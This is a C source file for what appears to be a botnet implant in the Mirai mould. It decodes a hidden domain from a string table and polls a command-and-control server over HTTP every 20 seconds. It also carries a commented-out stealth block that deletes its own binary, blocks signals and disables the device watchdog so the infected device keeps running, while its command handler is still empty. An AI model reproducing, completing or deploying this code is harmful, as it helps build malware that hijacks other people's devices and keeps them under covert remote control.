#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <sys/prctl.h>
#include <sys/select.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <string.h>

#include "http_client.h"
#include "ram_mem.h"
#include "utils.h"

#define RESPONSE_SIZE 8192

int main(int argc, char **argv) {

    int client_fd;
    struct sockaddr_in server_address;
    
    dict_init();

//#ifndef DEBUG
//    sigset_t sigs;
//    int wfd;
//
//    // Delete self
//    unlink(argv[0]);
//
//    // Signal based control flow
//    sigemptyset(&sigs);
//    sigaddset(&sigs, SIGINT);
//    sigprocmask(SIG_BLOCK, &sigs, NULL);
//    signal(SIGCHLD, SIG_IGN);
//    //signal(SIGTRAP, &anti_gdb_entry);
//
//    // Prevent watchdog from rebooting device
//    if ((wfd = open("/dev/watchdog", 2)) != -1 ||
//        (wfd = open("/dev/misc/watchdog", 2)) != -1)
//    {
//        int one = 1;
//
//        ioctl(wfd, 0x80045704, &one);
//        close(wfd);
//        wfd = 0;
//    }
//    chdir("/");
//#endif

    //polling
    while(1) {
        if (connection_init(&client_fd, &server_address, dict_get(DICT_DOMAIN_NAME)) < 0) {
            return 1;
        }

        char response[RESPONSE_SIZE];
        
        if(send_http_request(client_fd, dict_get(DICT_DOMAIN_NAME), "/polling") < 0) {
            close(client_fd);
            return 1;
        }

        if (recv_http_response(client_fd, response, RESPONSE_SIZE) > 0) {
#ifdef DEBUG
            printf("\n[http] Server Response:\n%s\n", get_last_line((char *)response));
#endif
        }

        //command manager
        
       
        
#ifdef DEBUG
        sleep(2); // delay between requests (in seconds)
#else
        sleep(20);
#endif

    }

    
    close(client_fd);
    dict_free();
    return 0;
}

